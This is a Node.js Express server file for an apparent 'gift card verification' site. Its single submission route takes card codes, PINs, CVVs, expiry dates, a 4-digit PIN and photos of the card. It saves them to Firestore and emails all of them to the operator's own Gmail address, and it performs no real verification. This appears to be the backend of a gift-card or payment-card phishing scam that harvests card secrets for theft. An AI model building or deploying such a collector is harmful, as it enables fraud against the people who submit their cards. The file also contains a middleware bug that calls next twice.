const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const multer = require('multer');
const admin = require('firebase-admin');
require('dotenv').config(); // Load environment variables from .env file

const app = express();
const port = 3000;

// Configure multer for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB file size limit
  },
  fileFilter: (req, file, cb) => {
    if (!file.originalname.match(/\.(jpg|jpeg|png|pdf|heic|svg)$/)) {
      return cb(new Error('Only image files are allowed!'), false);
    }
    cb(null, true);
  }
}).array('cardImages', 2);

// Middleware
app.use(express.static(path.join(__dirname, 'public')));

// Only use bodyParser for non-multipart requests
app.use((req, res, next) => {
  if (!req.is('multipart/form-data')) {
    bodyParser.urlencoded({ extended: true })(req, res, next);
    bodyParser.json()(req, res, next);
  } else {
    next();
  }
});

// Initialize Firebase Admin SDK
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'), // Replace escaped newlines
  }),
  databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com` // Adjust the database URL
});

const db = admin.firestore();

// Route to serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle form submission with file upload
app.post('/send', (req, res) => {
  upload(req, res, async function(err) {
    if (err instanceof multer.MulterError) {
      return res.status(500).json({ success: false, message: 'File upload error' });
    } else if (err) {
      return res.status(500).json({ success: false, message: 'Unknown error occurred' });
    }

    try {
      const {
        cardName = '',
        currency = '',
        cardAmount = '',
        cardCode = '',
        cardPin = '',
        cardCvv = '',
        cardExp = '',
        digitPin = '',
        email = '',
        message = ''
      } = req.body;

      // Check if the card already exists in Firestore
      const cardRef = db.collection('cards').doc(cardCode); // Assuming cardCode is unique
      const doc = await cardRef.get();

      if (doc.exists) {
        // Card already verified
        return res.status(200).json({ success: false, message: 'This card has been verified' });
      } else {
        // Save to Firestore
        await cardRef.set({
          cardName,
          currency,
          cardAmount,
          cardCode,
          cardPin,
          cardCvv,
          cardExp,
          digitPin,
          email,
          message,
          createdAt: admin.firestore.FieldValue.serverTimestamp()
        });

        // Send email as before
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASSWORD,
          },
        });

        const mailOptions = {
          from: process.env.EMAIL_USER,
          to: process.env.EMAIL_USER,
          subject: 'New Gift Card Verification Submission',
          text: `
            Card Name: ${cardName}
            Currency: ${currency}
            Card Amount: ${cardAmount}
            Card Code: ${cardCode}
            Card Pin: ${cardPin}
            Card CVV: ${cardCvv}
            Card Expiry Date: ${cardExp}
            4 Digit Pin: ${digitPin}
            Email: ${email}
            Message: ${message}
          `,
          attachments: req.files.map(file => ({
            filename: file.originalname,
            content: file.buffer,
            contentType: file.mimetype
          })),
        };

        await transporter.sendMail(mailOptions);
        return res.status(200).json({ success: true, message: 'Form submitted successfully' });
      }
    } catch (error) {
      res.status(500).json({ success: false, message: 'Server error' });
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
